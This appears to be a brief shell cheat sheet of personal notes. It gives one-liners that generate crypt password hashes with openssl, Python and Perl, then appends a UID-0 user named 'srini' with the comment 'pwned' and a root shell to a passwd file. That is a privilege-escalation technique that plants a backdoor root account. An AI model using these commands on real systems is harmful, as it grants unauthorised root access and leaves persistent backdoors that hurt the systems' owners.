# more shell

change root password to 1234

```
openssl passwd -6 -salt xyz 1234 # doesn't work anymore, used to
python3 -c 'import crypt; print(crypt.crypt("1234", "$6$1234"))'
python -c 'import crypt; print crypt.crypt("1234", "$6$1234")'
perl -e 'print crypt("1234","\$6\$saltsalt\$") . "\n"'

openssl passwd -1 srini
echo 'srini:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:pwned:/root:/bin/bash' >> passwd
```

